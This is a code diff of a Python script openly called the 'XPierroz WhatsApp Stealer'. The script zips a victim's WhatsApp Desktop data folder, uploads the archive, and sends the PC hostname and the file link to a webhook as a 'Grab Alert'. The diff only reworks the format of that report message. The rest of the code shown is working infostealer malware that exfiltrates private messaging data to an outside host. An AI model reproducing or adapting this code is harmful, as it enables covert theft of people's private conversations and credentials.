@@ -2,7 +2,7 @@ import os, requests, time, socket, shutil
 
 # PSG > OM
 
-WEBHOOK = "xpierroz and darknosy on top"
+WEBHOOK = "xpierroz on top"
 
 temp = "C:\Temp"
 direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
@@ -23,7 +23,6 @@ def upload(path):
 
 def l_om_est_eclate():
     try:
-        #shutil.make_archive("ssouput", "zip", direct)
         shutil.make_archive(os.path.join(temp, "ssouput"), "zip", direct)
     except Exception:
         pass
@@ -31,16 +30,19 @@ def l_om_est_eclate():
     m = upload(f"{temp}\\ssouput.zip")
     os.remove(f"{temp}\\ssouput.zip")
     
-    message = f"**XPierroz WhatsApp Stealer Report**\n\n"
-    message += f"🖥️ Pc: {socket.gethostname()}\n"
-    message += f"📎 Url: {m}"
-    
-    payload = {
-        "content": message,
-        "username": "XPierroz WhatsApp Stealer",
-        "avatar_url": "https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true"
+    embed = {
+        "title": "🔔 Grab Alert",
+        "description": f"**XPierroz WhatsApp Stealer Report**\n\n🖥️ Pc Name: {socket.gethostname()}\n📎 Url: {m}",
+        "color": 0x008000
     }
     
+    payload = {
+        "content": "@everyone",
+        "username": "XPierroz WhatsApp Stealer",
+        "avatar_url": "https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true",
+        "embeds": [embed]
+    }
+
     headers = {
         "Content-Type": "application/json"
     }
